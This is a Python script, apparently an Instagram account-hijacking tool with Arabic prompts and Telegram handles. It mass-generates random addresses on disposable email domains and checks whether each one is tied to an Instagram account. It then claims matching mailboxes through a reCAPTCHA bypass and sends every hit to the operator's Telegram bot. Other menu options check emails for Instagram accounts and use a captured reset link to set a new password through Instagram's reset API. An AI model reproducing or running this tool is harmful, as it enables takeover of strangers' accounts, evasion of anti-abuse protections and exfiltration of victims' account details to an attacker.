import requests
import re
import base64
import time
import os
import threading
import random
from time import sleep
import httpx
import uuid
import string
import user_agent
import websocket
import json
import datetime
import sys
import asyncio 
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent as elia
from threading import Thread
import requests, re, random, string, time, uuid, json
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\033[1;31m'   
X = '\033[1;33m'
F = '\033[2;32m'
R = '\033[1;31m'  
L = "\033[1;95m"
C = '\033[2;35m'
A = '\033[2;39m'
P = "\x1b[38;5;231m"
J = "\x1b[38;5;208m"
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
gg = '\x1b[38;5;208m'

def elia5():
    sd = random.choice([J1, J2, J21, J22, F1, C1, P1, P2])
    os.system('clear||cls')
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + f"""
        {X} {F} You can't defeat me!]    {X}                      
              {F}TLE : @JJ01YY / @LD5OD
    """)
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [67] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")

elia5()
print(' \x1b[1;32m ادخل توكن بوتك')
token = input('[]\033[1;37m  Token : ')
print(' \x1b[1;32m ادخل ايدي بوتك')
id = input('\033[1;32m[]\033[1;37m ID : ')
video_url = "https://t.me/ELIA_Python/1550"  
rd = requests.get(
    f'https://api.telegram.org/bot{token}/sendVideo?chat_id={id}&video={video_url}&caption='
    '┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n'
    '╮❲ تم تشغيل الاداة بنجاح ❳\n'
    '┤❲ سيتم ارسال الصيد الي بوتك ❳\n'
    '┤❲ المبرمج ❳ > @LD5OD\n'
    '╯❲ قنواتي تيليجرام ❳ ⇣\n'
    'BY❲ @JJ01YY❳ ❳\n'
    '┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉'
)
elia5()
print(f"{R}[{F}𝟏{R}] {C1}𝒉𝒊2.𝒊𝒏 [فحص ايميل hi2 ]") 
print(f"{R}[{F}𝟐{R}] {C1}𝒕𝒆𝒍𝒆𝒈𝒎𝒂𝒊𝒍.𝒄𝒐𝒎 [فحص ايميل 𝒕𝒆𝒍𝒆𝒈𝒎𝒂𝒊𝒍.𝒄𝒐𝒎 ]")
print(f"{R}[{F}𝟑{R}] {C1}𝒓𝒆𝒔𝒕 𝒆𝒎𝒂𝒊𝒍 𝒊𝒏𝒔𝒕𝒂 [ارسال ريست ] ")
print(f"{R}[{F}𝟒{R}] {C1}𝑪𝒉𝒂𝒏𝒈𝒆 𝒑𝒂𝒔𝒔𝒘𝒐𝒓𝒅 [تغير كلمه السر ] ")
ee = input(' \x1b[38;5;231m Choose the domain type :  ')
os.system('clear')
good_email=0
bad_email =0
good_insta=0
bad_insta=0
elia5()
def eelp():
	global good_email,good_insta,bad_insta,bad_email
	sys.stdout.write(f"\r {X} good ins {good_insta} | {Z} bad insta {bad_insta} | {F} True {good_email} | {L} False {bad_email}")
	sys.stdout.flush()
def eliaa():
		mid = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
		
		url = input("[ # ] - Enter Reset Url  : ")
		pas = input("[ # ] - Enter New Password : ")
		ses = requests.Session()
		lsd = "AdS-" + ''.join(random.choices(string.ascii_letters + string.digits, k=22))
		headers = {
		  'Host': "www.instagram.com",
		  'x-csrftoken': ''.join(random.choices(string.ascii_letters + string.digits + "_", k=22)),
		  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
		  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		  'upgrade-insecure-requests': "1",
		  'sec-fetch-site': "none",
		  'sec-fetch-mode': "navigate",
		  'sec-fetch-dest': "document",
		  'dpr': "2.8125",
		  'viewport-width': "980",
		  'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
		  'sec-ch-ua-mobile': "?0",
		  'sec-ch-ua-platform': "\"Linux\"",
		  'sec-ch-ua-platform-version': "\"\"",
		  'sec-ch-ua-model': "\"\"",
		  'sec-ch-ua-full-version-list': "\"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"150.0.7871.186\", \"Google Chrome\";v=\"150.0.7871.186\"",
		  'sec-ch-prefers-color-scheme': "dark",
		  'accept-language': "ar-YE,ar;q=0.9,en-US;q=0.8,en;q=0.7",
		  'priority': "u=0, i",
		  'Cookie': f"mid={mid}"
		}
		
		
		response = ses.get(url, headers=headers)
		
		base = "/".join(url.split("/")[:3])
		challenge_match = re.search(r"fetch\('([^']+)'", response.text)
		if challenge_match:
		    print("[ # ] - Solving The challenge ")
		    ses.post(f"{base}{challenge_match.group(1)}", headers=headers)
		    res = ses.get(url, headers=headers)
		else:
		    res = response
		ctx = re.search(r'"cuid":"[^"]*","cipher":"([^"]+)"', res.text).group(1)
		print(f"[ # ] - Get Ctx Of Account : {ctx}")
		headers.pop("Accept", None)
		headers.update({
		  'x-fb-friendly-name': "useCAAIGResetPasswordMutation",  
		  'x-ig-app-id': "936619743392459",
		  'x-asbd-id': "359341",
		  'referer': url,
		  'x-fb-lsd': lsd
		})
		
		payload = {
		    'av': "0", '__d': "www", '__user': "0", '__a': "1", '__req': "h", '__hs': "20668.HYP:instagram_web_pkg.2.1...0", 'dpr': "3", '__ccg': "POOR", '__comet_req': "7", 'lsd': lsd, 'jazoest': ''.join(random.choices(string.digits, k=5)), '__spin_b': "trunk", '__crn': "comet.igweb.PolarisCAAIGAccountRecoveryResetPasswordRoute", 'qpl_active_flow_ids': "516759801", 'fb_api_caller_class': "RelayModern", 'fb_api_req_friendly_name': "useCAAIGResetPasswordMutation", 'server_timestamps': "true",
		    'variables': json.dumps({
		        "input": {
		            "actor_id": "0", "client_mutation_id": "1", "access_flow_version": "pre_mt_behavior", "cipher": ctx, "login_ids": {"waterfall_id": str(uuid.uuid4())}, "next": None, "pwd": {"sensitive_string_value": f"#PWD_INSTAGRAM:0:{int(time.time())}:{pas}"}, "should_skip": False, "stay_logged_in_on_other_devices": False, "trusted_device_records": "{}"
		        }, "scale": 3
		    }, separators=(',', ':')),
		    'doc_id': "25366017989734603", 'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
		}
		time.sleep(3)
		req = ses.post("https://help.instagram.com/api/graphql", data=payload, headers=headers)
		if "caa_ar_ig_reset_password_submit" in req.text:
			print(f" [ # ] - تم تغير كلمه السر الجديده   : {pas}")
			
		else:
			print("BAD")

						
async def elia():
    email = input(' Email : ')
    try:
        headers = {
            "User-Agent": "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-bloks-version-id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
            "x-ig-app-id": "567067343352427",
        }
        data = {
            "search_query": email,
            "bloks_versioning_id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb"
        }
        async with httpx.AsyncClient(http2=True) as client:
            response = await client.post(
                "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
                headers=headers,
                data=data
            )            
            response_text = response.text
            if 'search_success_client' in response_text:
                print(f'✅ Good insta : {email}')
            else:
                print(f'❌ BAD insta :  {email}')    
    except Exception as e:
        print(f'VPN or Error: {e}')
if ee == '3':
    asyncio.run(elia())
    sys.exit()
if ee == '4':
    eliaa()
    sys.exit()    
def solve_recaptcha():
    try:
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
        params = anchor_url.split('?')[1]
        r = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{params}', timeout=10)
        token_recaptcha = r.text.split('recaptcha-token" value="')[1].split('"')[0]
        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={token_recaptcha}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible"
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{params}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        resp = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=payload, headers=headers, timeout=10)
        return resp.text.split('resp","')[1].split('"')[0]
    except:
        return None

def check_email(email):
    global good_email,good_insta,bad_insta,bad_email
    global token, id
    if "@" in email:
        email = email.split("@")[0]
    solve = solve_recaptcha()
    global ee
    if ee == '1':
        domain = 'hi2.in'
    elif ee == '2':
        domain = 'telegmail.com'
    else:
        print('❌ Invalid option')
        return False
    
    data = {
        'domain': f'@{domain}',
        'prefix': email,
        'recaptcha': solve,
    }
    headers = {
        'User-Agent': "Mozilla/5.0",
        'Accept': "application/json, text/plain, */*",
        'authorization': "Basic bnVsbA==",
    }
    
    try:
        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers).json()
        if 'expiry' in response:
            good_email+=1
            eelp()
            ee_text = f"""
Instagram 
•---•----•-----•-----•-----
email : {email}@{domain}
•---•----•-----•-----•-----
@LD5OD
"""
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={ee_text}')
            return True
        else:
            bad_email+=1
            eelp()
            return False
    except:
        pass
        return False

def em(email):
    global good_email,good_insta,bad_insta,bad_email
    try:
        with httpx.Client(http2=True, timeout=30) as client:
            res = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={email}",
                headers={
                    'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
                }
            ).json()
        
        if res.get('error_type') == 'email_is_taken':
            good_insta+=1
            eelp()
            check_email(email)
        else:
        	bad_insta+=1
        	eelp()
    except Exception as e:
    	pass
def qq():
    global ee
    if ee == '1':
        domain = 'hi2.in'
    elif ee == '2':
        domain = 'telegmail.com'
    else:
        print("❌ Invalid option")
        return
    
    letters = "abcdefghijklmnopqrstuvwxyz"
    cil = "".join(random.choice(letters) for _ in range(5))
    email = f"{cil}@{domain}"
    em(email)

def worker():
    while True:
        qq()
        sleep(random.uniform(0.5, 2))
if ee in ['1', '2']:
    threads_count = 15
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(worker)
